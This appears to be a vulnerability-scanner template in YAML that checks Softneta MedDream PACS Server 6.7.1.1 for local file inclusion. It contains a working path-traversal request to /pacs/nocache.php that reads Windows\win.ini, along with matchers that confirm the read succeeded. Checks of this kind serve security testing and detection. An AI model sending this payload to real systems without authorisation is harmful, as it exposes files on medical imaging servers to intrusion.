id: "sofneta-mecdream-pacs-lfi"
name: "Softneta MedDream PACS Server Premium 6.7.1.1 - Local File Inclusion"
severity: "high"
description: "Softneta MedDream PACS Server Premium 6.7.1.1 is vulnerable to local file inclusion."
tech:
  - "php"
tags:
  - "sofneta"
  - "lfi"
  - "edb"
  - "vuln"
cwe: "CWE-22"
reference: "https://www.exploit-db.com/exploits/45347"
spaExclusion: true
request:
  method: "GET"
  path: "/pacs/nocache.php?path=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "or"
matchers:
  - type: "word"
    part: "body"
    words:
      - "bit app support"
      - "fonts"
      - "extensions"
    condition: "and"
